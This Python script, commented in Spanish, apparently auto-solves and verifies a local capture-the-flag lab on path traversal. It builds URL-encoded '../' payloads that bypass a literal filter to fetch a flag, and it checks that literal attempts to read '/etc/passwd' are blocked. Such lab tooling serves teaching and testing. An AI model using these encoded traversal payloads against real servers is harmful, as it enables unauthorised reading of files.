#!/usr/bin/env python3
"""Auto-solver PT-02 (encoding bypass) + comprobaciones del filtro."""

from __future__ import annotations

import argparse
import sys
from pathlib import Path
from urllib.parse import quote

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from solve_ctf_auth import asegurar_sesion

from app.ctf_pathtraversal.lab_db import (
    filtro_traversal_literal_bloqueado,
    inicializar_lab_pathtraversal,
    resolver_descarga_vulnerable,
)

FLAG = "flag{path_traversal_encoding_bypass}"


def _payloads_encoding() -> list[str]:
    """Variantes que evaden el filtro literal pero decodifican a un ../ válido."""
    destino = "../archivos_secretos/flag_02.txt"
    return [
        "..%2farchivos_secretos%2fflag_02.txt",
        "%2e%2e%2farchivos_secretos%2fflag_02.txt",
        "..%2f" + "archivos_secretos%2fflag_02.txt",
        quote(destino, safe=""),
    ]


def _get_descarga_02(sesion, base: str, query_file: str):
    """GET con query cruda (requests.params re-codifica y rompe el lab 02)."""
    url = f"{base.rstrip('/')}/objetivos/pathtraversal/02/descargar?file={query_file}"
    return sesion.get(url, timeout=20)


def verificar_filtro_local() -> None:
    assert filtro_traversal_literal_bloqueado("../etc/passwd")
    assert filtro_traversal_literal_bloqueado("..\\windows\\win.ini")
    assert not filtro_traversal_literal_bloqueado("..%2farchivos_secretos%2fflag_02.txt")


def main() -> int:
    p = argparse.ArgumentParser()
    p.add_argument("--base", default="http://127.0.0.1:5000")
    args = p.parse_args()
    base = args.base.rstrip("/")

    inicializar_lab_pathtraversal()
    verificar_filtro_local()

    s = asegurar_sesion(base)

    r = _get_descarga_02(s, base, "../../../archivos_secretos/flag_02.txt")
    assert r.status_code == 400, f"Literal ../ debe dar 400, got {r.status_code}"
    print("[OK] Lab 02 bloquea ../ literal (400)")

    exito = False
    for payload in _payloads_encoding():
        r = _get_descarga_02(s, base, payload)
        if r.status_code == 200 and FLAG in r.text:
            print(f"[OK] Payload encoding: {payload[:50]}…")
            exito = True
            break
    assert exito, "Ningún payload codificado obtuvo la flag"

    r = _get_descarga_02(s, base, "../../../../../etc/passwd")
    assert r.status_code == 400, "Escape con ../ literal debe ser 400 en lab 02"

    r = s.get(
        f"{base}/objetivos/pathtraversal/01/descargar",
        params={"file": "../../../../../etc/passwd"},
        timeout=20,
    )
    assert r.status_code == 404, "Lab 01 debe rechazar /etc/passwd (404)"

    ok, _ = resolver_descarga_vulnerable("../../../../../etc/passwd")
    assert ok is None, "Sandbox: no escape del módulo"
    print(f"[OK] PT-02 — {FLAG}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
